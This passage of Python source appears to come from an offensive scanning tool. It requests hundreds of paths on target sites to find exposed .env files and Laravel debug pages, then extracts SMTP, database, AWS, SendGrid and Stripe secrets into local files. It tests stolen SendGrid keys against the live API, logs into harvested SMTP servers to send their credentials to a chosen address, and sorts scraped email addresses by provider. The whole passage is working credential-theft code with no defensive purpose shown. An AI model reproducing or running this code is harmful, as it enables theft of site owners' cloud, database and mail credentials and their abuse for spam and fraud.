                            awsREGION = i.split('=')[1].strip()
                            aws_region.append(awsREGION)
                except:
                    continue

            for i in range(len(aws_key)):
                try:
                    data_add = {}
                    data_add['AWS_ACCESS_KEY_ID'] = aws_key[i]
                    data_add['AWS_SECRET_ACCESS_KEY'] = aws_secret[i]
                    data_add['AWS_DEFAULT_REGION'] = aws_region[i]
                    AWSData.append(data_add)
                except:
                    continue

            for AWS_ in AWSData:
                try:
                    if AWS_['AWS_ACCESS_KEY_ID'] != '' and AWS_['AWS_SECRET_ACCESS_KEY'] != '' and AWS_['AWS_ACCESS_KEY_ID'] != ' ' and AWS_['AWS_SECRET_ACCESS_KEY'] != ' ':
                        print(f"\033[32;1m [*] Amazon Key: \033[37;1m{AWS_['AWS_ACCESS_KEY_ID']}\033[34;1m|\033[37;1m{AWS_['AWS_SECRET_ACCESS_KEY']}\033[34;1m|\033[37;1m{AWS_['AWS_DEFAULT_REGION']}\033[0m")
                        with open('scanner/awskeys.txt', 'a+') as output:
                            output.write(f"{AWS_['AWS_ACCESS_KEY_ID']}|{AWS_['AWS_SECRET_ACCESS_KEY']}|{AWS_['AWS_DEFAULT_REGION']}\n")
                    else:
                        pass
                except:
                    continue


        SMTP(argFile)
        AWS(argFile)
        AWS1(argFile)
        DB(argFile)
        NEXMO(argFile)

    def sendGridCheck(self, apiKey):
        h = {'Authorization': f'Bearer {apiKey}',
        'Content-Type': 'application/json'}
        r = requests.get('https://api.sendgrid.com/v3/user/credits', headers=h)
        if r.status_code == 200:
            limitDATA = r.json()
            h = {'Authorization': f'Bearer {apiKey}',
            'Content-Type': 'application/json'}
            r = requests.get('https://api.sendgrid.com/v3/user/email', headers=h)
            fromEMAIL = r.json()
            print(f"\033[32;1m [*] SENDGRID VALID \033[34;1m: \033[37;1m{apiKey}\n\033[37;1mAvailable Limit: \033[32;1m{limitDATA['total']}\n\033[37;1mRemaining Credits: \033[32;1m{limitDATA['remain']}\n\033[37;1mEmailFROM: \033[32;1m{fromEMAIL['email']}\033[0m")
            with open('scanner/sendgrid_valid.txt', 'a+') as output:
                output.write(f"SENDGRID VALID : {apiKey}\nAvailable Limit: {limitDATA['total']}\nRemaining Credits: {limitDATA['remain']}\nEmailFROM: {fromEMAIL['email']}\nSMTPDATA: smtp.sendgrid.net|587|apikey|{apiKey}|{fromEMAIL['email']}\n\n")
        else:
            print(r.text)

    def smtpChecker(self, smtps, email):
        try:
            if 'mailtrap' not in smtps:
                receiver_mail = email
                host,port,username,passwd = smtps.split('|')
                send_data = MIMEText(f'{host}|{port}|{username}|{passwd}')
                socket.setdefaulttimeout(60)
                login_ = smtplib.SMTP(host, int(port))
                login_.starttls()
                try:
                    login_.login(username, passwd)
                    login_.sendmail(username, receiver_mail, send_data.as_string())
                    login_.quit()

                    print(f'\033[32;1m[*] Success \033[34;1m: \033[37;1m{host}\033[34;1m|\033[37;1m{port}\033[34;1m|\033[37;1m{username}\033[34;1m|\033[37;1m{passwd}\033[0m')
                    with open('scanner/smtp_hit.txt', 'a+') as output:
                        output.write(f'{host}|{port}|{username}|{passwd}\n')
                except:
                    print(f'\033[31;1m[!] Failed to Login \033[34;1m: \033[37;1m{host}\033[34;1m|\033[37;1m{port}\033[34;1m|\033[37;1m{username}\033[34;1m|\033[37;1m{passwd}\033[0m')
                    pass
            else:
                pass
        except:
            pass

    def mailExtract(self, mails):
        if path.exists('mailfiltered'):
                pass
        else:
            os.mkdir('mailfiltered')

        if '@yahoo.' in mails or '@ymail.' in mails:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'yahoo.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass
        elif '@gmail.com' in mails:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'gmail.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass
        elif '@aol' in mails:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'aol.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass
        elif '@orange' in mails:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'orange.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass
        elif '@outlook' in mails:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'outlook.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass
        elif '@hotmail' in mails:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'hotmail.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass
        else:
            if len(mails) > 11:
                print(mails)
                with open(os.path.join('mailfiltered', 'others.txt'), 'a+') as output:
                    output.write(f'{mails}\n')
            else:
                pass

    def envScanner(self, url):
        def SMTP(content):
            try:
                if 'MAIL_' in content:
                    mailHOST = re.findall('MAIL_HOST=(.*)', content)[0].strip()
                    mailPORT = re.findall('MAIL_PORT=(.*)', content)[0].strip()
                    mailUSER = re.findall('MAIL_USERNAME=(.*)', content)[0].strip()
                    mailPASS = re.findall('MAIL_PASSWORD=(.*)', content)[0].strip()
                    if mailHOST != '' and mailPORT != '' and mailUSER != '' and mailPASS != '':
                        if mailHOST != 'null' and mailPORT != 'null' and mailUSER != 'null' and mailPASS != 'null':
                            if mailHOST != 'localhost' and 'mailtrap' not in mailHOST:
                                print(f'\033[32;1m[SMTP INFO] \033[34;1m: \033[37;1m{mailHOST}\033[34;1m|\033[37;1m{mailPORT}\033[34;1m|\033[37;1m{mailUSER}\033[34;1m|\033[37;1m{mailPASS}\033[0m')
                                with open('scanner/smtp_tochk.txt', 'a+') as output:
                                    output.write(f'{mailHOST}|{mailPORT}|{mailUSER}|{mailPASS}\n')
                            else:
                                pass
                    if mailHOST != '' and mailPORT != '' and mailUSER != '' and mailPASS != '':
                        if mailHOST != 'null' and mailPORT != 'null' and mailUSER != 'null' and mailPASS != 'null':
                            if mailPASS.startswith('SG.'):
                                with open('scanner/sendgrid_valid.txt', 'a+') as output:
                                    output.write(f'{mailPASS}\n')
                            else:
                                pass
            except:
                print('ERROR.')
                pass

        def DB(content):
            try:
                if 'DB_' in content:
                    dbHOST = re.findall('DB_HOST=(.*)', content)[0].strip()
                    dbPORT = re.findall('DB_PORT=(.*)', content)[0].strip()
                    dbUSER = re.findall('DB_USERNAME=(.*)', content)[0].strip()
                    dbPASS = re.findall('DB_PASSWORD=(.*)', content)[0].strip()

                    if dbHOST != '' and dbPORT != '' and dbUSER != '' and dbPASS != '':
                        if 'localhost' not in dbHOST and '127.0.0.1' not in dbHOST:
                            if dbHOST != 'null' and dbPORT != 'null' and dbUSER != 'null' and dbPASS != 'null':
                                print(f'\033[32;1m[DB INFO] \033[34;1m: \033[37;1m{dbHOST}\033[34;1m|\033[37;1m{dbPORT}\033[34;1m|\033[37;1m{dbUSER}\033[34;1m|\033[37;1m{dbPASS}\033[0m')
                                with open('scanner/database_valid.txt', 'a+') as output:
                                    output.write(f'{dbHOST}|{dbPORT}|{dbUSER}|{dbPASS}\n')
            except:
                print('ERROR')
                pass
            
        def AWS(content):
            try:
                if 'AWS_' in content:
                    awsKEY = re.findall('AWS_KEY=(.*)', content)[0].strip()
                    awsSECRET = re.findall('AWS_SECRET=(.*)', content)[0].strip()
                    awsREGION = re.findall('AWS_REGION=(.*)', content)[0].strip()

                    if awsKEY != '' and awsSECRET != '':
                        if awsKEY != 'null' and awsSECRET != 'null':
                            print(f'\033[32;1m[AWS INFO] \033[34;1m: \033[37;1m{awsKEY}\033[34;1m|\033[37;1m{awsSECRET}\033[34;1m|\033[37;1m{awsREGION}\033[0m')
                            with open('scanner/aws_valid.txt', 'a+') as output:
                                output.write(f'{awsKEY}|{awsSECRET}|{awsREGION}\n')
                    else:
                        pass
            except:
                print('ERROR')
                pass

        def AWS1(content):
            try:
                if 'AWS_' in content:
                    awsKEY = re.findall('AWS_ACCESS_KEY_ID=(.*)', content)[0].strip()
                    awsSECRET = re.findall('AWS_SECRET_ACCESS_KEY=(.*)', content)[0].strip()
                    awsREGION = re.findall('AWS_DEFAULT_REGION=(.*)', content)[0].strip()

                    if awsKEY != '' and awsSECRET != '':
                        if awsKEY != 'null' and awsSECRET != 'null':
                            print(f'\033[32;1m[AWS INFO] \033[34;1m: \033[37;1m{awsKEY}\033[34;1m|\033[37;1m{awsSECRET}\033[34;1m|\033[37;1m{awsREGION}\033[0m')
                            with open('scanner/aws_valid.txt', 'a+') as output:
                                output.write(f'{awsKEY}|{awsSECRET}|{awsREGION}\n')
                    else:
                        pass
            except:
                print('ERROR')
                pass

        def DB_DEBUG(data):
            try:
                if 'DB_' in data:
                    dbHOST = re.findall('<td>DB_HOST</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    dbPORT = re.findall('<td>DB_PORT</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    dbUSER = re.findall('<td>DB_USERNAME</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    dbPASS = re.findall('<td>DB_PASSWORD</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    if dbHOST != '' and dbPORT != '' and dbUSER != '' and dbPASS != '':
                        if dbHOST != 'null' and dbPORT != 'null' and dbUSER != 'null' and dbPASS != 'null':
                            if '127.0.0.1' not in dbHOST and dbHOST != 'localhost' and dbHOST != '127001':
                                print(f'\033[32;1m[DB INFO] \033[34;1m: \033[37;1m{dbHOST}\033[37;1m|\033[37;1m{dbPORT}\033[34;1m|\033[37;1m{dbUSER}\033[34;1m|\033[37;1m{dbPASS}\033[0m')
                                with open('scanner/database_valid.txt', 'a+') as output:
                                    output.write(f'{dbHOST}|{dbPORT}|{dbUSER}|{dbPASS}\n')
                            else:
                                pass
                    else:
                        pass
            except:
                pass

        def SMTP_DEBUG(data):
            try:
                if 'MAIL_' in data:
                    mailHOST = re.findall('<td>MAIL_HOST</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    mailPORT = re.findall('<td>MAIL_PORT</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    mailUSER = re.findall('<td>MAIL_USERNAME</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    mailPASS = re.findall('<td>MAIL_PASSWORD</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()

                    if mailHOST != '' and mailPORT != '' and mailUSER != '' and mailPASS != '':
                        if mailHOST != 'null' and mailPORT != 'null' and mailUSER != 'null' and mailPASS != 'null':
                            if 'localhost' not in mailHOST and '127.0.0.1' not in mailHOST and 'mailtrap' not in mailHOST:
                                print(f'\033[32;1m[SMTP INFO] \033[34;1m: \033[37{mailHOST}\033[34;1m|\033[37;1m{mailPORT}\033[34;1m|\033[37;1m{mailUSER}\033[32;1m|\033[37;1m{mailPASS}\033[0m')
                                with open('scanner/smtp_tochk.txt', 'a+') as output:
                                    output.write(f'{mailHOST}|{mailPORT}|{mailUSER}|{mailPASS}\n')
                            
                    if mailHOST != '' and mailPORT != '' and mailUSER != '' and mailPASS != '':
                        if mailHOST != 'null' and mailPORT != 'null' and mailUSER != 'null' and mailPASS != 'null':
                            if mailPASS.startswith('SG.'):
                                with open('scanner/sendgrid_valid.txt', 'a+') as output:
                                    output.write(f'{mailPASS}\n')
                            else:
                                pass
            except:
                pass

        def AWS_DEBUG(data):
            try:
                if 'AWS_' in data:
                    awsKEY = re.findall('<td>AWS_ACCESS_KEY_ID</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    awsSECRET = re.findall('AWS_SECRET_ACCESS_KEY</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    awsREGION = re.findall('<td>AWS_DEFAULT_REGION</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()

                    if awsKEY != '' and awsSECRET != '':
                        if awsSECRET != 'null' and awsSECRET != 'null':
                            print(f'\033[32;1m{awsKEY}\033[34;1m|\033[32;1m{awsSECRET}\033[34;1m|\033[32;1m{awsREGION}\033[0m')
                            with open('scanner/aws_valid.txt', 'a+') as output:
                                output.write(f'{awsKEY}|{awsSECRET}|{awsREGION}\n')
                        else:
                            pass
                    else:
                        pass
            except:
                pass

        def AWS_DEBUG1(data):
            try:
                if 'AWS_' in data:
                    awsKEY = re.findall('<td>AWS_KEY</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    awsSECRET = re.findall('AWS_SECRET</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()
                    awsREGION = re.findall('<td>AWS_REGION</td>\s+<td><pre.*>(.*)</span>', data)[0].strip()

                    if awsKEY != '' and awsSECRET != '':
                        if awsSECRET != 'null' and awsSECRET != 'null':
                            print(f'\033[32;1m{awsKEY}\033[34;1m|\033[32;1m{awsSECRET}\033[34;1m|\033[32;1m{awsREGION}\033[0m')
                            with open('scanner/aws_valid.txt', 'a+') as output:
                                output.write(f'{awsKEY}|{awsSECRET}|{awsREGION}\n')
                        else:
                            pass
                    else:
                        pass
            except:
                pass
         
        def SK(data):  
            sk_key = re.findall('STRIPE_KEY=(.*)', data)

            if len(sk_key) == 0:
                sk_key = re.findall('STRIPE_SECRET=(.*)', data)
            
            for sk in sk_key:
                if sk != '':
                    with open('scanner/sk_keys.txt', 'a') as f:
                        f.write(sk + '\n')
        
        def getENV(url, plainURL):

            if os.path.exists('envs'):
                pass
            else:
                os.mkdir('envs')

            uriPATH = ['/','local/', 'admin/', 'dev/', 'api/', 'stag/', 'platform/', 'staging/', 'development/', 'localhost/', 'test/', 'production/', 'developer/', 'public/', 'app/', 'core/', 'data/', 'api1/', 'api2/', 'api3/', 'API/', 'apiv1/', 'apiv2/', 'apiv3/', 'apps/', 'git/', 'laravel/', 'sites/', 'web/', 'v1/api/', 'v2/api/', 'v3/api/', 'site/', 'admin/', 'administrator/', 'backend/', 'portal/', 'office/', 'application/', 'laravel2/', 'laravel1/', 'default/', 'public/laravel/', 'laravel/public/', 'st/', 'blog/', 'blogs/', 'admins/', 'Admin/', 'ADMIN/', 'ADMINISTRATOR/', 'Administrator/', 'Site/', 'Public/', 'Staging/', 'Stag/', 'Production/', 'prod/', 'Prod/', 'Local/', 'Development/', 'Backend/', 'Api/' ,'Api1/' ,'APIV1/', 'Platform/', 'Laravel/', 'Web/', 'Core/', 'App/','/__tests__/test-become/.env', '/_static/.env', '/.c9/metadata/environment/.env', '/.docker/.env', '/.docker/laravel/app/.env', '/.env', '/.env.backup', '/.env.dev', '/.env.development.local', '/.env.docker.dev', '/.env.example', '/.env.local', '/.env.php', '/.env.prod', '/.env.production.local', '/.env.sample.php', '/.env.save', '/.env.stage', '/.env.test', '/.env.test.local', '/.env~', '/.gitlab-ci/.env', '/.vscode/.env', '/3-sequelize/final/.env', '/07-accessing-data/begin/vue-heroes/.env', '/07-accessing-data/end/vue-heroes/.env', '/08-routing/begin/vue-heroes/.env', '/08-routing/end/vue-heroes/.env', '/09-managing-state/begin/vue-heroes/.env', '/09-managing-state/end/vue-heroes/.env', '/31_structure_tests/.env', '/acme_challenges/.env', '/acme-challenge/.env', '/acme/.env', '/actions-server/.env', '/admin-app/.env', '/admin/.env', '/adminer/.env', '/administrator/.env', '/agora/.env', '/alpha/.env', '/anaconda/.env', '/api/.env', '/api/src/.env', '/app_dir/.env', '/app_nginx_static_path/.env', '/app-order-client/.env', '/app/.env', '/app/client/.env', '/app/code/community/Nosto/Tagging/.env', '/app/config/.env', '/app/config/dev/.env', '/app/frontend/.env', '/app1-static/.env', '/app2-static/.env', '/apps/.env', '/apps/client/.env', '/Archipel/.env', '/asset_img/.env', '/assets/.env', '/Assignment3/.env', '/Assignment4/.env', '/audio/.env', '/awstats/.env', '/babel-plugin-dotenv/test/fixtures/as-alias/.env', '/babel-plugin-dotenv/test/fixtures/default/.env', '/babel-plugin-dotenv/test/fixtures/dev-env/.env', '/babel-plugin-dotenv/test/fixtures/empty-values/.env', '/babel-plugin-dotenv/test/fixtures/filename/.env', '/babel-plugin-dotenv/test/fixtures/override-value/.env', '/babel-plugin-dotenv/test/fixtures/prod-env/.env', '/back-end/app/.env', '/back/.env', '/backend/.env', '/backend/src/.env', '/backendfinaltest/.env', '/backup/.env', '/base_dir/.env', '/basic-network/.env', '/bgoldd/.env', '/bitcoind/.env', '/blankon/.env', '/blob/.env', '/blog/.env', '/blue/.env', '/bookchain-client/.env', '/bootstrap/.env', '/boxes/oracle-vagrant-boxes/ContainerRegistry/.env', '/boxes/oracle-vagrant-boxes/Kubernetes/.env', '/boxes/oracle-vagrant-boxes/OLCNE/.env', '/bucoffea/.env', '/build/.env', '/cardea/backend/.env', '/cdw-backend/.env', '/cgi-bin/.env', '/ch2-mytodo/.env', '/ch6-mytodo/.env', '/ch6a-mytodo/.env', '/ch7-mytodo/.env', '/ch7a-mytodo/.env', '/ch8-mytodo/.env', '/ch8a-mytodo/.env', '/ch8b-mytodo/.env', '/Chai/.env', '/challenge/.env', '/challenges/.env', '/charts/liveObjects/.env', '/chat-client/.env', '/chiminey/.env', '/client-app/.env', '/client/.env', '/client/mutual-fund-app/.env', '/client/src/.env', '/ClientApp/.env', '/clld_dir/.env', '/cmd/testdata/expected/dot_env/.env', '/code/api/.env', '/code/web/.env', '/CodeGolf.Web/ClientApp/.env', '/codenames-frontend/.env', '/collab-connect-web-application/server/.env', '/collected_static/.env', '/community/.env', '/conf/.env', '/config/.env', '/ContainerRegistry/.env', '/content/.env', '/core/.env', '/core/app/.env', '/core/Datavase/.env', '/core/persistence/.env', '/core/src/main/resources/org/jobrunr/dashboard/frontend/.env', '/counterblockd/.env', '/counterwallet/.env', '/cp/.env', '/cron/.env', '/cronlab/.env', '/cryo_project/.env', '/css/.env', '/custom/.env', '/d/.env', '/data/.env', '/database/.env', '/dataset1/.env', '/dataset2/.env', '/default/.env', '/delivery/.env', '/demo-app/.env', '/demo/.env', '/deploy/.env', '/developerslv/.env', '/development/.env', '/directories/.env', '/dist/.env', '/django_project_path/.env', '/django-blog/.env', '/django/.env', '/doc/.env', '/docker-compose/platform/.env', '/docker-elk/.env', '/docker-network-healthcheck/.env', '/docker-node-mongo-redis/.env', '/docker/.env', '/docker/app/.env', '/docker/compose/withMongo/.env', '/docker/compose/withPostgres/.env', '/docker/database/.env', '/docker/db/.env', '/docker/examples/compose/.env', '/docker/postgres/.env', '/docker/webdav/.env', '/docs/.env', '/dodoswap-client/.env', '/dotfiles/.env', '/download/.env', '/downloads/.env', '/e2e/.env', '/en/.env', '/engine/.env', '/env/.env', '/env/dockers/mariadb-test/.env', '/env/dockers/php-apache/.env', '/env/example/.env', '/env/template/.env', '/environments/local/.env', '/environments/production/.env', '/error/.env', '/errors/.env', '/example/.env', '/example02-golang-package/import-underscore/.env', '/example27-how-to-load-env/sample01/.env', '/example27-how-to-load-env/sample02/.env', '/examples/.env', '/examples/01-simple-model/.env', '/examples/02-complex-example/.env', '/examples/03-one-to-many-relationship/.env', '/examples/04-many-to-many-relationship/.env', '/examples/05-migrations/.env', '/examples/06-base-service/.env', '/examples/07-feature-flags/.env', '/examples/08-performance/.env', '/examples/09-production/.env', '/examples/10-subscriptions/.env', '/examples/11-transactions/.env', '/examples/drupal-separate-services/.env', '/examples/react-dashboard/backend/.env', '/examples/sdl-first/.env', '/examples/sdl-first/prisma/.env', '/examples/vue-dashboard/backend/.env', '/examples/web/.env', '/examples/with-cookie-auth-fauna/.env', '/examples/with-dotenv/.env', '/examples/with-firebase-authentication-serverless/.env', '/examples/with-react-relay-network-modern/.env', '/examples/with-relay-modern/.env', '/examples/with-universal-configuration-build-time/.env', '/exapi/.env', '/Exercise.Frontend/.env', '/Exercise.Frontend/train/.env', '/export/.env', '/fastlane/.env', '/favicons/.env', '/favs/.env', '/FE/huey/.env', '/fedex/.env', '/fhir-api/.env', '/files/.env', '/fileserver/.env', '/films/.env', '/Final_Project/Airflow_Dag/.env', '/Final_Project/kafka_twitter/.env', '/Final_Project/StartingFile/.env', '/finalVersion/lcomernbootcamp/projbackend/.env', '/FIRST_CONFIG/.env', '/first-network/.env', '/fisdom/fisdom/.env', '/fixtures/blocks/.env', '/fixtures/fiber-debugger/.env', '/fixtures/flight/.env', '/fixtures/kitchensink/.env', '/flask_test_uploads/.env', '/fm/.env', '/font-icons/.env', '/fonts/.env', '/front-app/.env', '/front-empathy/.env', '/front-end/.env', '/front/.env', '/front/src/.env', '/frontend/.env', '/frontend/momentum-fe/.env', '/frontend/react/.env', '/frontend/vue/.env', '/frontendfinaltest/.env', '/ftp/.env', '/ftpmaster/.env', '/gists/cache', '/gists/laravel', '/gists/pusher', '/github-connect/.env', '/grems-api/.env', '/grems-frontend/.env', '/Hash/.env', '/hasura/.env', '/Helmetjs/.env', '/hgs-static/.env', '/higlass-website/.env', '/home/.env', '/horde/.env', '/hotpot-app-frontend/.env', '/htdocs/.env', '/html/.env', '/http/.env', '/httpboot/.env', '/HUNIV_migration/.env', '/icon/.env', '/icons/.env', '/ikiwiki/.env', '/image_data/.env', '/Imagebord/.env', '/images/.env', '/img/.env', '/install/.env', '/InstantCV/server/.env', '/items/.env', '/javascript/.env', '/js-plugin/.env', '/js/.env', '/jsrelay/.env', '/jupyter/.env', '/khanlinks/.env', '/kibana/.env', '/kodenames-server/.env', '/kolab-syncroton/.env', '/Kubernetes/.env', '/lab/.env', '/laravel/.env', '/latest/.env', '/layout/.env', '/lcomernbootcamp/projbackend/.env', '/leafer-app/.env', '/ledger_sync/.env', '/legacy/tests/9.1.1', '/legacy/tests/9.2.0', '/legal/.env', '/lemonldap-ng-doc/.env', '/lemonldap-ng-fr-doc/.env', '/letsencrypt/.env', '/lib/.env', '/Library/.env', '/libs/.env', '/linux/.env', '/local/.env', '/log/.env', '/logging/.env', '/login/.env', '/mail/.env', '/mailinabox/.env', '/mailman/.env', '/main_user/.env', '/main/.env', '/manual/.env', '/master/.env', '/media/.env', '/memcached/.env', '/mentorg-lava-docker/.env', '/micro-app-react-communication/.env', '/micro-app-react/.env', '/mindsweeper/gui/.env', '/minified/.env', '/misc/.env', '/Modix/ClientApp/.env', '/monerod/.env', '/mongodb/config/dev/.env', '/monitoring/compose/.env', '/moodledata/.env', '/msks/.env', '/munki_repo/.env', '/music/.env', '/MyRentals.Web/ClientApp/.env', '/name/.env', '/new-js/.env', '/news-app/.env', '/nginx-server/.env', '/nginx/.env', '/niffler-frontend/.env', '/node_modules/.env', '/Nodejs-Projects/play-ground/login/.env', '/Nodejs-Projects/play-ground/ManageUserRoles/.env', '/noVNC/.env', '/Nuke.App.Ui/.env', '/oldsanta/.env', '/ops/vagrant/.env', '/option/.env', '/orientdb-client/.env', '/outputs/.env', '/owncloud/.env', '/packages/api/.env', '/packages/app/.env', '/packages/client/.env', '/packages/frontend/.env', '/packages/plugin-analytics/src/fixtures/analytics-ga-key/.env', '/packages/plugin-qiankun/examples/app1/.env', '/packages/plugin-qiankun/examples/app2/.env', '/packages/plugin-qiankun/examples/app3/.env', '/packages/plugin-qiankun/examples/master/.env', '/packages/react-scripts/fixtures/kitchensink/template/.env', '/packages/styled-ui-docs/.env', '/packages/web/.env', '/packed/.env', '/page-editor/.env', '/parity/.env', '/Passportjs/.env', '/patchwork/.env', '/path/.env', '/pfbe/.env', '/pictures/.env', '/playground/.env', '/plugin_static/.env', '/post-deployment/.vscode/.env', '/postfixadmin/.env', '/price_hawk_client/.env', '/prisma/.env', '/private/.env', '/processor/.env', '/prod/.env', '/projbackend/.env', '/project_root/.env', '/psnlink/.env', '/pt2/countries/src/.env', '/pt8/library-backend-gql/.env', '/pub/.env', '/public_html/.env', '/public_root/.env', '/public/.env', '/question2/.env', '/qv-frontend/.env', '/rabbitmq-cluster/.env', '/rails-api/react-app/.env', '/rasax/.env', '/react_todo/.env', '/redmine/.env', '/repo/.env', '/repos/.env', '/repository/.env', '/resources/.env', '/resources/docker/.env', '/resources/docker/mysql/.env', '/resources/docker/phpmyadmin/.env', '/resources/docker/rabbitmq/.env', '/resources/docker/rediscommander/.env', '/resourcesync/.env', '/rest/.env', '/restapi/.env', '/results/.env', '/robots/.env', '/root/.env', '/rosterBack/.env', '/roundcube/.env', '/roundcubemail/.env', '/routes/.env', '/run/.env', '/rust-backend/.env', '/rust-backend/dao/.env', '/s-with-me-front/.env', '/saas/.env', '/samples/chatroom/chatroom-spa/.env', '/samples/docker/deploymentscripts/.env', '/script/.env', '/scripts/.env', '/scripts/fvt/.env', '/selfish-darling-backend/.env', '/Serve_time_server/.env', '/serve-browserbench/.env', '/Server_with_db/.env', '/server/.env', '/server/config/.env', '/server/laravel/.env', '/server/src/persistence/.env', '/services/adminer/.env', '/services/deployment-agent/.env', '/services/documents/.env', '/services/graylog/.env', '/services/jaeger/.env', '/services/minio/.env', '/services/monitoring/.env', '/services/portainer/.env', '/services/redis-commander/.env', '/services/registry/.env', '/services/simcore/.env', '/services/traefik/.env', '/sessions/.env', '/shared/.env', '/shibboleth/.env', '/shop/.env', '/Simple_server/.env', '/site-library/.env', '/site/.env', '/sitemaps/.env', '/sites/.env', '/sitestatic/.env', '/Socketio/.env', '/sources/.env', '/Sources/API/.env', '/spearmint/.env', '/spikes/config-material-app/.env', '/SpotiApps/.env', '/src/__tests__/__fixtures__/instanceWithDependentSteps/.env', '/src/__tests__/__fixtures__/typeScriptIntegrationProject/.env', '/src/__tests__/__fixtures__/typeScriptProject/.env', '/src/__tests__/__fixtures__/typeScriptVisualizeProject/.env', '/src/.env', '/src/add-auth/express/.env', '/src/assembly/.env', '/src/character-service/.env', '/src/client/mobile/.env', '/src/core/tests/dotenv-files/.env', '/src/gameprovider-service/.env', '/src/main/front-end/.env', '/src/main/resources/archetype-resources/__rootArtifactId__-acceptance-test/src/test/resources/app-launcher-tile/.env', '/src/renderer/.env', '/srv6_controller/controller/.env', '/srv6_controller/examples/.env', '/srv6_controller/node-manager/.env', '/st-js-be-2020-movies-two/.env', '/stackato-pkg/.env', '/static_prod/.env', '/static_root/.env', '/static_user/.env', '/static-collected/.env', '/static-html/.env', '/static-root/.env', '/static/.env', '/staticfiles/.env', '/stats/.env', '/storage/.env', '/style/.env', '/styles/.env', '/stylesheets/.env', '/symfony/.env', '/system-config/.env', '/system/.env', '/target/.env', '/temanr9/.env', '/temanr10/.env', '/temp/.env', '/template/.env', '/templates/.env', '/test-network/.env', '/test-network/addOrg3/.env', '/test/.env', '/test/aries-js-worker/fixtures/.env', '/test/bdd/fixtures/adapter-rest/.env', '/test/bdd/fixtures/agent-rest/.env', '/test/bdd/fixtures/couchdb/.env', '/test/bdd/fixtures/demo/.env', '/test/bdd/fixtures/demo/openapi/.env', '/test/bdd/fixtures/did-method-rest/.env', '/test/bdd/fixtures/did-rest/.env', '/test/bdd/fixtures/edv-rest/.env', '/test/bdd/fixtures/openapi-demo/.env', '/test/bdd/fixtures/sidetree-mock/.env', '/test/bdd/fixtures/universalresolver/.env', '/test/bdd/fixtures/vc-rest/.env', '/test/fixtures/.env', '/test/fixtures/app_types/node/.env', '/test/fixtures/app_types/rails/.env', '/test/fixtures/node_path/.env', '/test/integration/env-config/app/.env', '/testfiles/.env', '/testing/docker/.env', '/tests/.env', '/Tests/Application/.env', '/tests/default_settings/v7.0/.env', '/tests/default_settings/v8.0/.env', '/tests/default_settings/v9.0/.env', '/tests/default_settings/v10.0/.env', '/tests/default_settings/v11.0/.env', '/tests/default_settings/v12.0/.env', '/tests/default_settings/v13.0/.env', '/tests/drupal-test/.env', '/tests/Integration/Environment/.env', '/tests/todo-react/.env', '/testwork_json/.env', '/theme_static/.env', '/theme/.env', '/thumb/.env', '/thumbs/.env', '/tiedostot/.env', '/tmp/.env', '/tools/.env', '/Travel_form/.env', '/ts/prime/.env', '/ubuntu/.env', '/ui/.env', '/unixtime/.env', '/unsplash-downloader/.env', '/upfiles/.env', '/upload/.env', '/uploads/.env', '/urlmem-app/.env', '/User_info/.env', '/v1/.env', '/v2/.env', '/var/backup/.env', '/vendor/.env', '/vendor/github.com/gobuffalo/envy/.env', '/vendor/github.com/subosito/gotenv/.env', '/videos/.env', '/vm-docker-compose/.env', '/vod_installer/.env', '/vue_CRM/.env', '/vue-end/vue-til/.env', '/vue/vuecli/.env', '/web-dist/.env', '/web/.env', '/Web/siteMariage/.env', '/webroot_path/.env', '/websocket/.env', '/webstatic/.env', '/webui/.env', '/well-known/.env', '/whturk/.env', '/windows/tests/9.2.x/.env', '/windows/tests/9.3.x/.env', '/wp-content/.env', '/www-data/.env', '/www/.env', '/xx-final/vue-heroes/.env', '/zmusic-frontend/.env']

            for PATHS in uriPATH:
                keys = ['DB_HOST=', 'MAIL_HOST=', 'MAIL_USERNAME=', 'APP_ENV=']
                r = requests.get(f'{url}{PATHS}.env', verify=False, timeout=10, allow_redirects=False)
                print(f'\033[33;1m[ENV SCANNER] \033[34;1m: \033[37;1m{r.url}\033[0m')
                if r.status_code == 200:
                    if any(key in r.text for key in keys):
                        print(f'\033[32;1m[ENV SCANNER VULN] \033[34: \033[37{r.url}\033[0m')
                        with open(os.path.join('envs', f'{plainURL}_env.txt'), 'a+') as output:
                            output.write(f'{r.text}\n')

                        SMTP(r.text)
                        DB(r.text)
                        AWS(r.text)
                        AWS1(r.text)
                        SK(r.text)

        def getENV1(url, plainURL):
            if os.path.exists('envs'):
                pass
            else:
                os.mkdir('envs')
            try:
                ID = ['<td>DB_CONNECTION</td>', '<td>APP_DEBUG</td>', '<td>APP_ENV</td>', '<td>MAIL_HOST</td>']
                data = {'debug': 'true'}
                r = requests.post(url, data=data, allow_redirects=False, verify=False, timeout=10)
                print(f'\033[32;1m[ENV SCANNER DEBUG] \033[34m: \033[37m{r.url}\033[0m')
                if any(Identifier in r.text for Identifier in ID):
                    print(f'\033[32;1m[ENV SCANNER DEBUG VULN] \033[34m: \033[37m{r.url}\033[0m')
